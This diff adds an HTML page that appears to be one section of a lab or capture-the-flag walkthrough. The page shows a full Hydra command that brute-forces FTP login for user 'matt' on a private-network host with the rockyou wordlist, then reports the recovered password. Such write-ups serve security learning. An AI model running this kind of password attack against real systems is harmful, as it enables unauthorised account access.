@@ -1,0 +1,8 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>3.3 Hydra</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><a name="h2-1"></a><strong><h2>3.3 Hydra</h2></strong><br /><br />We have enumerated two usernames let’s go  for brute force attack with the help of “hydra” and try to find its  password for login into FTP.<br /><br /><div class="codebox"><div class="codebox">$&nbsp;hydra&nbsp;-l&nbsp;matt&nbsp;-P&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>rockyou.txt&nbsp;192.168.12.32&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;-e&nbsp;nsr<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/113-1.png" alt="images/113-1.png" /><br /><br />We've found one of them.<br /><br />Username: “matt”<br />Password: “cheese”<br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>
